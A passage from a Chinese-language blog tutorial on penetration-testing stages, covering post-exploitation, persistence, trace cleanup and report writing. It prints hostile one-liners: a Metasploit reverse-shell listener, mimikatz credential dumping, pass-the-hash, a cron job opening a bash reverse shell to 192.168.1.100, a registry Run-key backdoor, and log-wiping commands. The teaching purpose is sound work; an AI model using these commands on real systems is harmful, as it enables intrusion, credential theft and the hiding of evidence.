+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x <span class="string">&quot;use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.100; run&quot;</span>  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="阶段-4：后渗透（Post-Exploitation）"><a href="#阶段-4：后渗透（Post-Exploitation）" class="headerlink" title="阶段 4：后渗透（Post-Exploitation）"></a><strong>阶段 4：后渗透（Post-Exploitation）</strong></h3><p><strong>1. 权限提升（提权）</strong></p>
+<ul>
+<li><p><strong>Linux</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l  <span class="comment"># 检查sudo权限  </span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null  <span class="comment"># 查找SUID文件  </span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Windows</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv  <span class="comment"># 查看特权  </span></span><br><span class="line">systeminfo | findstr <span class="string">&quot;KB&quot;</span>  <span class="comment"># 补丁分析  </span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 横向移动（内网渗透）</strong></p>
+<ul>
+<li><p><strong>凭证窃取</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::logonpasswords&quot;</span>  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Pass the Hash</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.1.0/24 -u admin -H NTLM_HASH  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>BloodHound分析域环境</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d domain.local -u user -p pass -ns 192.168.1.1  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="阶段-5：权限维持（Persistence）"><a href="#阶段-5：权限维持（Persistence）" class="headerlink" title="阶段 5：权限维持（Persistence）"></a><strong>阶段 5：权限维持（Persistence）</strong></h3><p><strong>1. 后门部署</strong></p>
+<ul>
+<li><p><strong>Linux</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1&#x27;&quot;</span> &gt;&gt; /var/spool/cron/root  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Windows</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d <span class="string">&quot;C:\shell.exe&quot;</span>  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>2. 痕迹清理</strong></p>
+<ul>
+<li><p><strong>删除日志</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shred</span> -zu /var/log/auth.log  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>清除Windows事件日志</strong>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl Security  </span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="阶段-6：报告撰写"><a href="#阶段-6：报告撰写" class="headerlink" title="阶段 6：报告撰写"></a><strong>阶段 6：报告撰写</strong></h3><p><strong>1. 漏洞分类</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong>风险等级</strong></th>
+<th align="left"><strong>标准</strong></th>
+<th align="left"><strong>示例</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">高危</td>
+<td align="left">直接获取系统权限&#x2F;敏感数据</td>
+<td align="left">RCE、SQL注入获取管理员</td>
+</tr>
+<tr>
+<td align="left">中危</td>
+<td align="left">需多步骤利用或条件限制</td>
+<td align="left">CSRF、水平越权</td>
+</tr>
+<tr>
+<td align="left">低危</td>
+<td align="left">信息泄露但无法直接利用</td>
+<td align="left">版本信息暴露</td>
+</tr>
+</tbody></table>
+<p><strong>2. 报告内容</strong></p>
+<ul>
+<li><strong>执行摘要</strong>：非技术语言描述风险影响。</li>
+<li><strong>漏洞详情</strong>：<ul>
+<li><strong>复现步骤</strong>：截图+命令（如Burp请求包）。</li>
+<li><strong>修复建议</strong>：代码示例（如参数化查询）。</li>
+</ul>
+</li>
+<li><strong>附录</strong>：原始数据（Nmap扫描结果、Exploit代码）。</li>
+</ul>
+<hr>
+<h3 id="渗透测试流程图"><a href="#渗透测试流程图" class="headerlink" title="渗透测试流程图"></a><strong>渗透测试流程图</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[授权与范围确认] --&gt; B[信息收集]</span><br><span class="line">    B --&gt; C[漏洞扫描/利用]</span><br><span class="line">    C --&gt; D&#123;是否获取权限?&#125;</span><br><span class="line">    D --&gt;|是| E[后渗透:提权/横向移动]</span><br><span class="line">    D --&gt;|否| C</span><br><span class="line">    E --&gt; F[权限维持]</span><br><span class="line">    F --&gt; G[报告撰写]</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="实战技巧"><a href="#实战技巧" class="headerlink" title="实战技巧"></a><strong>实战技巧</strong></h3><ol>
+<li><strong>自动化工具链</strong>：<ul>
+<li>将常用命令写成脚本（如自动扫描+报告生成）。</li>
+</ul>
+</li>
+<li><strong>规避检测</strong>：<ul>
+<li>使用<code>proxychains</code>隐藏IP，修改User-Agent。</li>
+</ul>
+</li>
+<li><strong>思维导图</strong>：<ul>
+<li>用XMind整理攻击路径（如从Web到内网的跳板）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>工具包推荐</strong>：</p>
+<ul>
+<li><strong>红队版Kali</strong>：<a target="_blank" rel="noopener" href="https://www.kali.org/blog/kali-linux-purple/">Kali Purple</a></li>
+<li><strong>渗透框架</strong>：<a target="_blank" rel="noopener" href="https://www.metasploit.com/">Metasploit</a>、<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">Cobalt Strike</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10"><span class="toc-number">1.</span> <span class="toc-text">Day1 CIA三元组、OWASP TOP10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CIA%E4%B8%89%E5%85%83%E7%BB%84%EF%BC%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%9F%BA%E7%9F%B3"><span class="toc-number">1.1.</span> <span class="toc-text">CIA三元组：信息安全的核心基石</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9C%BA%E5%AF%86%E6%80%A7%EF%BC%88Confidentiality%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 机密性（Confidentiality）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%8C%E6%95%B4%E6%80%A7%EF%BC%88Integrity%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 完整性（Integrity）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%88Availability%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 可用性（Availability）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CIA%E7%9A%84%E5%B9%B3%E8%A1%A1%E4%B8%8E%E5%86%B2%E7%AA%81"><span class="toc-number">1.1.4.</span> <span class="toc-text">CIA的平衡与冲突</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CIA%E7%9A%84%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.5.</span> <span class="toc-text">CIA的扩展模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.1.6.</span> <span class="toc-text">实战中的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E6%A1%88%E4%BE%8B"><span class="toc-number">1.1.7.</span> <span class="toc-text">经典案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OWASP-Top-10"><span class="toc-number">1.2.</span> <span class="toc-text">OWASP Top 10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%88Injection%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 注入攻击（Injection）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%A4%B1%E6%95%88%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%88Broken-Authentication%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 失效的身份认证（Broken Authentication）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%EF%BC%88Sensitive-Data-Exposure%EF%BC%89"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 敏感数据泄露（Sensitive Data Exposure）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%88XXE%EF%BC%89"><span class="toc-number">1.2.4.</span> <span class="toc-text">4. XML外部实体注入（XXE）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%A4%B1%E6%95%88%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%88Broken-Access-Control%EF%BC%89"><span class="toc-number">1.2.5.</span> <span class="toc-text">5. 失效的访问控制（Broken Access Control）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%EF%BC%88Security-Misconfiguration%EF%BC%89"><span class="toc-number">1.2.6.</span> <span class="toc-text">6. 安全配置错误（Security Misconfiguration）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89"><span class="toc-number">1.2.7.</span> <span class="toc-text">7. 跨站脚本（XSS）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Insecure-Deserialization%EF%BC%89"><span class="toc-number">1.2.8.</span> <span class="toc-text">8. 不安全的反序列化（Insecure Deserialization）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">1. 漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">2. 攻击场景与漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">3. 检测与漏洞挖掘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">4. 防御方案</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E4%B8%8E%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.8.5.</span> <span class="toc-text">5. 实战靶场与工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.8.6.</span> <span class="toc-text">6. 漏洞案例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E9%AB%98%E7%BA%A7%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.2.8.7.</span> <span class="toc-text">7. 高级绕过技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%BC%81%E4%B8%9A%E7%BA%A7%E9%98%B2%E6%8A%A4%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.8.8.</span> <span class="toc-text">8. 企业级防护建议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BD%BF%E7%94%A8%E5%90%AB%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%84%E4%BB%B6%EF%BC%88Using-Components-with-Known-Vulnerabilities%EF%BC%89"><span class="toc-number">1.2.9.</span> <span class="toc-text">9. 使用含已知漏洞的组件（Using Components with Known Vulnerabilities）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%97%A5%E5%BF%97%E4%B8%8E%E7%9B%91%E6%8E%A7%E4%B8%8D%E8%B6%B3%EF%BC%88Insufficient-Logging-Monitoring%EF%BC%89"><span class="toc-number">1.2.10.</span> <span class="toc-text">10. 日志与监控不足（Insufficient Logging &amp; Monitoring）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8OWASP-Top-10%EF%BC%9F"><span class="toc-number">1.2.11.</span> <span class="toc-text">如何利用OWASP Top 10？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86%E6%B5%81%E7%A8%8B%EF%BC%88PTES%E6%A0%87%E5%87%86-%E5%AE%9E%E6%88%98%E7%BB%86%E5%8C%96%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">渗透测试标准流程（PTES标准 + 实战细化）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-1%EF%BC%9A%E6%98%8E%E7%A1%AE%E8%8C%83%E5%9B%B4%E4%B8%8E%E8%A7%84%E5%88%99"><span class="toc-number">1.3.1.</span> <span class="toc-text">阶段 1：明确范围与规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-2%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88Reconnaissance%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">阶段 2：信息收集（Reconnaissance）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-3%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">阶段 3：漏洞扫描与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-4%EF%BC%9A%E5%90%8E%E6%B8%97%E9%80%8F%EF%BC%88Post-Exploitation%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">阶段 4：后渗透（Post-Exploitation）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-5%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88Persistence%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">阶段 5：权限维持（Persistence）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B6%E6%AE%B5-6%EF%BC%9A%E6%8A%A5%E5%91%8A%E6%92%B0%E5%86%99"><span class="toc-number">1.3.6.</span> <span class="toc-text">阶段 6：报告撰写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="toc-number">1.3.7.</span> <span class="toc-text">渗透测试流程图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7"><span class="toc-number">1.3.8.</span> <span class="toc-text">实战技巧</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&text=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&is_video=false&description=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Day1 CIA三元组、OWASP TOP10&body=Check out this article: http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&title=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&name=Day1 CIA三元组、OWASP TOP10&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/23/Day1-CIA%E4%B8%89%E5%85%83%E7%BB%84%E3%80%81OWASP-TOP10/&t=Day1 CIA三元组、OWASP TOP10"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    P1ant731
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
